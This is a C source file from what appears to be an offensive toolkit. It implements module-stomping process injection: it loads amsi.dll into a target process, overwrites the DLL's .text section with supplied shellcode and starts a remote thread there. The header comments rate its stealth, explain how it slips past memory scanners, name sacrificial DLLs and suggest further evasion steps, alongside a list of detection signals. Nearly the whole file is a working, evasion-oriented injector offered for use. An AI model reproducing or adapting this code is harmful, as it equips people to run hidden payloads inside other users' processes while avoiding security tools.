/*
 * inject_stomp.c - Module Stomping Injection
 *
 * Starburst Arsenal Kit - Injection Techniques
 * =============================================
 *
 * TECHNIQUE: Module Stomping (DLL Hollowing)
 *
 * This technique loads a legitimate DLL into the target process, then
 * overwrites its .text section with shellcode. When the shellcode
 * executes, it runs from image-backed memory that appears to belong
 * to a legitimate, signed DLL. This defeats VAD-based scanning that
 * flags private executable memory.
 *
 * FLOW:
 *   1. OpenProcess - get handle to target
 *   2. Load sacrificial DLL into target process:
 *      - VirtualAllocEx + WriteProcessMemory (DLL path string)
 *      - CreateRemoteThread(LoadLibraryA) to load the DLL
 *      - Find loaded DLL base address via EnumProcessModules
 *   3. Parse DLL PE headers to find .text section RVA and size
 *   4. Write shellcode over .text section via WriteProcessMemory
 *   5. Create thread at the stomped .text section address
 *   6. Execution appears to originate from a legitimate DLL
 *
 * OPSEC RATING: HIGH
 *
 *   This is one of the strongest injection techniques for evading
 *   memory scanners. The shellcode lives in image-backed memory
 *   associated with a legitimate DLL, which means:
 *   - VAD tree shows the memory as IMAGE type (not PRIVATE)
 *   - The memory is backed by a file on disk (the DLL)
 *   - Thread start address resolves to a known module
 *   - Memory scanners that only flag private executable memory miss it
 *
 *   The main weakness is that the DLL's on-disk .text content won't
 *   match the in-memory .text content, which integrity-checking
 *   scanners can detect.
 *
 * DETECTION SURFACE:
 *   - ETW: Microsoft-Windows-Threat-Intelligence
 *       * EtwTiWriteVirtualMemory (overwriting DLL .text section)
 *       * EtwTiProtectVirtualMemory (if protection is changed)
 *   - Kernel callbacks:
 *       * PsSetLoadImageNotifyRoutine (DLL load in target)
 *       * PsSetCreateThreadNotifyRoutineEx (remote thread)
 *   - User-mode hooks:
 *       * CreateRemoteThread (for LoadLibrary and execution)
 *       * WriteProcessMemory (overwriting .text)
 *   - Behavioral:
 *       * DLL loaded then its .text immediately overwritten
 *       * Disk vs memory content mismatch on image-backed pages
 *       * Unusual DLL loaded into a process that normally doesn't use it
 *       * Thread executing from middle of .text section
 *   - Advanced:
 *       * Page hash verification (disk vs memory)
 *       * Code integrity checks on loaded modules
 *
 * MONITORED API CALLS:
 *   OpenProcess, VirtualAllocEx, WriteProcessMemory,
 *   CreateRemoteThread, LoadLibraryA (remote),
 *   EnumProcessModules, GetModuleFileNameExA
 *
 * PROS:
 *   - Shellcode runs from image-backed memory (defeats VAD scans)
 *   - Thread start address resolves to a legitimate module
 *   - File on disk backs the memory region (appears legitimate)
 *   - Very effective against basic memory scanners
 *
 * CONS:
 *   - Complex implementation (PE parsing, module enumeration)
 *   - Still uses CreateRemoteThread (twice: LoadLibrary + execution)
 *   - Disk/memory content mismatch detectable by integrity checks
 *   - Loading an unusual DLL into a process is a behavioral signal
 *   - Shellcode must fit within .text section of sacrificial DLL
 *   - WriteProcessMemory to image-backed pages generates ETW events
 *
 * SACRIFICIAL DLL SELECTION:
 *   Choose a DLL that:
 *   - Has a .text section large enough for the shellcode
 *   - Is not commonly loaded (won't conflict with existing loads)
 *   - Is signed by Microsoft (adds legitimacy)
 *   - Has few imports (minimizes side effects of loading)
 *   Good choices: amsi.dll, chakra.dll, msvcp140.dll
 *   The default here uses amsi.dll (small, always available).
 *
 * ADAPTING FOR STARBURST PIC (Stardust framework):
 *   - Replace CreateRemoteThread with NtCreateThreadEx
 *   - Consider using Nt-level APIs for the entire flow
 *   - PE parsing logic can be lifted directly into PIC code
 *   - For ultimate stealth, combine with:
 *     * Indirect syscalls for WriteProcessMemory replacement
 *     * Thread pool execution instead of CreateRemoteThread
 *     * Transacted file operations for the DLL load
 *
 * COMPILE:
 *   cl.exe /W4 /O2 inject_stomp.c psapi.lib /Fe:inject_stomp.exe
 *   or
 *   x86_64-w64-mingw32-gcc -O2 -Wall inject_stomp.c -lpsapi -o inject_stomp.exe
 */

#include <windows.h>
#include <psapi.h>
#include <stdio.h>
#include <string.h>
#include "../include/injection.h"

/* Default sacrificial DLL to stomp */
#define SACRIFICIAL_DLL "amsi.dll"

/*
 * find_remote_module_base - Find the base address of a loaded module
 * in a remote process by name.
 *
 * Parameters:
 *   hProcess   - Handle to target process
 *   moduleName - Name of the module to find (e.g., "amsi.dll")
 *
 * Returns:
 *   Base address of the module, or NULL if not found.
 */
static HMODULE find_remote_module_base(HANDLE hProcess, const char *moduleName) {
    HMODULE hModules[1024];
    DWORD   cbNeeded;
    char    szModName[MAX_PATH];

    if (!EnumProcessModules(hProcess, hModules, sizeof(hModules), &cbNeeded)) {
        fprintf(stderr, "[!] EnumProcessModules failed: %lu\n", GetLastError());
        return NULL;
    }

    DWORD moduleCount = cbNeeded / sizeof(HMODULE);
    for (DWORD i = 0; i < moduleCount; i++) {
        if (GetModuleFileNameExA(hProcess, hModules[i],
                                 szModName, sizeof(szModName))) {
            /* Check if the module name matches (case-insensitive) */
            char *baseName = strrchr(szModName, '\\');
            if (baseName) baseName++;
            else baseName = szModName;

            if (_stricmp(baseName, moduleName) == 0) {
                return hModules[i];
            }
        }
    }

    return NULL;
}

/*
 * find_text_section - Parse PE headers of a remote module to find
 * the .text section's RVA and size.
 *
 * Parameters:
 *   hProcess    - Handle to target process
 *   moduleBase  - Base address of the module in the remote process
 *   textRVA     - [out] RVA of the .text section
 *   textSize    - [out] Size of the .text section
 *
 * Returns:
 *   TRUE if .text section found, FALSE otherwise.
 */
static BOOL find_text_section(HANDLE hProcess, HMODULE moduleBase,
                               DWORD *textRVA, DWORD *textSize) {
    IMAGE_DOS_HEADER dosHeader;
    IMAGE_NT_HEADERS ntHeaders;
    SIZE_T bytesRead;

    /* Read DOS header */
    if (!ReadProcessMemory(hProcess, (LPCVOID)moduleBase,
                           &dosHeader, sizeof(dosHeader), &bytesRead)) {
        fprintf(stderr, "[!] Failed to read DOS header: %lu\n", GetLastError());
        return FALSE;
    }

    if (dosHeader.e_magic != IMAGE_DOS_SIGNATURE) {
        fprintf(stderr, "[!] Invalid DOS signature\n");
        return FALSE;
    }

    /* Read NT headers */
    LPVOID ntHeaderAddr = (LPVOID)((ULONG_PTR)moduleBase + dosHeader.e_lfanew);
    if (!ReadProcessMemory(hProcess, ntHeaderAddr,
                           &ntHeaders, sizeof(ntHeaders), &bytesRead)) {
        fprintf(stderr, "[!] Failed to read NT headers: %lu\n", GetLastError());
        return FALSE;
    }

    if (ntHeaders.Signature != IMAGE_NT_SIGNATURE) {
        fprintf(stderr, "[!] Invalid NT signature\n");
        return FALSE;
    }

    /* Read section headers */
    WORD numberOfSections = ntHeaders.FileHeader.NumberOfSections;
    LPVOID sectionHeaderAddr = (LPVOID)(
        (ULONG_PTR)ntHeaderAddr +
        sizeof(DWORD) +                               /* Signature */
        sizeof(IMAGE_FILE_HEADER) +
        ntHeaders.FileHeader.SizeOfOptionalHeader
    );

    for (WORD i = 0; i < numberOfSections; i++) {
        IMAGE_SECTION_HEADER sectionHeader;
        LPVOID currentSectionAddr = (LPVOID)(
            (ULONG_PTR)sectionHeaderAddr +
            (i * sizeof(IMAGE_SECTION_HEADER))
        );

        if (!ReadProcessMemory(hProcess, currentSectionAddr,
                               &sectionHeader, sizeof(sectionHeader),
                               &bytesRead)) {
            continue;
        }

        /* Check for .text section */
        if (memcmp(sectionHeader.Name, ".text", 5) == 0) {
            *textRVA  = sectionHeader.VirtualAddress;
            *textSize = sectionHeader.Misc.VirtualSize;
            return TRUE;
        }
    }

    fprintf(stderr, "[!] .text section not found\n");
    return FALSE;
}

/*
 * inject - Perform module stomping injection into a target process.
 *
 * Parameters:
 *   pid           - Target process ID
 *   shellcode     - Pointer to shellcode buffer
 *   shellcode_len - Size of shellcode in bytes
 *
 * Returns:
 *   TRUE on success, FALSE on failure.
 */
BOOL inject(DWORD pid, LPVOID shellcode, SIZE_T shellcode_len) {
    HANDLE  hProcess       = NULL;
    HANDLE  hThreadLoad    = NULL;
    HANDLE  hThreadExec    = NULL;
    LPVOID  remoteDllPath  = NULL;
    HMODULE hRemoteDll     = NULL;
    DWORD   textRVA        = 0;
    DWORD   textSize       = 0;
    DWORD   oldProtect     = 0;
    BOOL    result         = FALSE;

    const char *dllPath = SACRIFICIAL_DLL;
    SIZE_T dllPathLen = strlen(dllPath) + 1;

    /* --------------------------------------------------------
     * Step 1: Open target process
     * -------------------------------------------------------- */
    hProcess = OpenProcess(
        PROCESS_ALL_ACCESS,
        FALSE, pid
    );
    if (!hProcess) {
        fprintf(stderr, "[!] OpenProcess failed: %lu\n", GetLastError());
        goto cleanup;
    }
    fprintf(stderr, "[+] Opened process %lu\n", pid);

    /* --------------------------------------------------------
     * Step 2: Load the sacrificial DLL into the target process
     *
     * We do this by writing the DLL path string into the remote
     * process and calling LoadLibraryA via CreateRemoteThread.
     *
     * This causes the DLL to be legitimately loaded by the
     * Windows loader, creating proper image-backed memory
     * regions in the process's VAD tree.
     * -------------------------------------------------------- */

    /* 2a: Allocate memory for the DLL path string */
    remoteDllPath = VirtualAllocEx(
        hProcess, NULL, dllPathLen,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
    );
    if (!remoteDllPath) {
        fprintf(stderr, "[!] VirtualAllocEx (DLL path) failed: %lu\n",
                GetLastError());
        goto cleanup;
    }

    /* 2b: Write the DLL path string */
    if (!WriteProcessMemory(hProcess, remoteDllPath, dllPath,
                            dllPathLen, NULL)) {
        fprintf(stderr, "[!] WriteProcessMemory (DLL path) failed: %lu\n",
                GetLastError());
        goto cleanup;
    }

    /* 2c: Call LoadLibraryA in the remote process */
    FARPROC pLoadLibraryA = GetProcAddress(
        GetModuleHandleA("kernel32.dll"), "LoadLibraryA"
    );
    if (!pLoadLibraryA) {
        fprintf(stderr, "[!] Failed to resolve LoadLibraryA\n");
        goto cleanup;
    }

    hThreadLoad = CreateRemoteThread(
        hProcess, NULL, 0,
        (LPTHREAD_START_ROUTINE)pLoadLibraryA,
        remoteDllPath,
        0, NULL
    );
    if (!hThreadLoad) {
        fprintf(stderr, "[!] CreateRemoteThread (LoadLibrary) failed: %lu\n",
                GetLastError());
        goto cleanup;
    }

    /* Wait for DLL to load */
    WaitForSingleObject(hThreadLoad, 5000);
    CloseHandle(hThreadLoad);
    hThreadLoad = NULL;

    fprintf(stderr, "[+] Sacrificial DLL '%s' loaded in target\n", dllPath);

    /* 2d: Free the DLL path string (no longer needed) */
    VirtualFreeEx(hProcess, remoteDllPath, 0, MEM_RELEASE);
    remoteDllPath = NULL;

    /* --------------------------------------------------------
     * Step 3: Find the loaded DLL in the remote process
     * -------------------------------------------------------- */
    hRemoteDll = find_remote_module_base(hProcess, dllPath);
    if (!hRemoteDll) {
        fprintf(stderr, "[!] Failed to find loaded DLL in target\n");
        goto cleanup;
    }
    fprintf(stderr, "[+] DLL base address: 0x%p\n", (void *)hRemoteDll);

    /* --------------------------------------------------------
     * Step 4: Find the .text section of the loaded DLL
     *
     * We parse the PE headers from the remote process to find
     * the .text section's virtual address and size.
     * -------------------------------------------------------- */
    if (!find_text_section(hProcess, hRemoteDll, &textRVA, &textSize)) {
        fprintf(stderr, "[!] Failed to find .text section\n");
        goto cleanup;
    }
    fprintf(stderr, "[+] .text section: RVA=0x%08lX, Size=%lu bytes\n",
            (unsigned long)textRVA, (unsigned long)textSize);

    /* Verify shellcode fits in .text section */
    if (shellcode_len > textSize) {
        fprintf(stderr,
                "[!] Shellcode (%zu bytes) exceeds .text section (%lu bytes)\n",
                shellcode_len, (unsigned long)textSize);
        fprintf(stderr, "[!] Choose a DLL with a larger .text section\n");
        goto cleanup;
    }

    /* Calculate the absolute address of .text in the remote process */
    LPVOID textAddr = (LPVOID)((ULONG_PTR)hRemoteDll + textRVA);
    fprintf(stderr, "[+] .text absolute address: 0x%p\n", textAddr);

    /* --------------------------------------------------------
     * Step 5: Stomp the .text section with shellcode
     *
     * First, change protection to RW so we can write.
     * Then write the shellcode over the .text content.
     * Finally, restore to RX.
     *
     * The memory region remains image-backed throughout this
     * process. The VAD entry still points to the DLL file.
     * Only the page content differs from the on-disk file.
     * -------------------------------------------------------- */

    /* 5a: Change .text protection to RW */
    if (!VirtualProtectEx(hProcess, textAddr, shellcode_len,
                          PAGE_READWRITE, &oldProtect)) {
        fprintf(stderr, "[!] VirtualProtectEx (RW) failed: %lu\n",
                GetLastError());
        goto cleanup;
    }

    /* 5b: Write shellcode over .text section */
    SIZE_T bytesWritten = 0;
    if (!WriteProcessMemory(hProcess, textAddr, shellcode,
                            shellcode_len, &bytesWritten)) {
        fprintf(stderr, "[!] WriteProcessMemory (stomp) failed: %lu\n",
                GetLastError());
        goto cleanup;
    }
    fprintf(stderr, "[+] Stomped %zu bytes over .text section\n", bytesWritten);

    /* 5c: Restore .text protection to RX */
    if (!VirtualProtectEx(hProcess, textAddr, shellcode_len,
                          PAGE_EXECUTE_READ, &oldProtect)) {
        fprintf(stderr, "[!] VirtualProtectEx (RX) failed: %lu\n",
                GetLastError());
        goto cleanup;
    }
    fprintf(stderr, "[+] Memory protection restored to RX\n");

    /* --------------------------------------------------------
     * Step 6: Execute from the stomped .text section
     *
     * The thread start address now points into the .text section
     * of a legitimately loaded DLL. Memory scanners that check
     * the VAD tree will see this as image-backed memory belonging
     * to the sacrificial DLL.
     * -------------------------------------------------------- */
    hThreadExec = CreateRemoteThread(
        hProcess, NULL, 0,
        (LPTHREAD_START_ROUTINE)textAddr,
        NULL, 0, NULL
    );
    if (!hThreadExec) {
        fprintf(stderr, "[!] CreateRemoteThread (exec) failed: %lu\n",
                GetLastError());
        goto cleanup;
    }
    fprintf(stderr, "[+] Executing from stomped .text section\n");

    WaitForSingleObject(hThreadExec, INFINITE);
    fprintf(stderr, "[+] Execution completed\n");

    result = TRUE;

cleanup:
    if (hThreadLoad)  CloseHandle(hThreadLoad);
    if (hThreadExec)  CloseHandle(hThreadExec);
    if (remoteDllPath)
        VirtualFreeEx(hProcess, remoteDllPath, 0, MEM_RELEASE);
    if (hProcess) CloseHandle(hProcess);

    return result;
}

#ifdef BUILD_STANDALONE
int main(int argc, char *argv[]) {
    if (argc != 2) {
        printf("Usage: %s <PID>\n", argv[0]);
        return 1;
    }

    DWORD pid = (DWORD)atoi(argv[1]);

    /* Placeholder shellcode */
    unsigned char shellcode[] = {
        0x90, 0x90, 0x90, 0x90,
        0xCC
    };

    printf("[*] Module stomping injection\n");
    printf("[*] Target PID: %lu\n", pid);
    printf("[*] Sacrificial DLL: %s\n", SACRIFICIAL_DLL);
    printf("[*] Shellcode size: %zu bytes\n", sizeof(shellcode));

    if (inject(pid, shellcode, sizeof(shellcode))) {
        printf("[+] Injection succeeded\n");
        return 0;
    } else {
        printf("[-] Injection failed\n");
        return 1;
    }
}
#endif
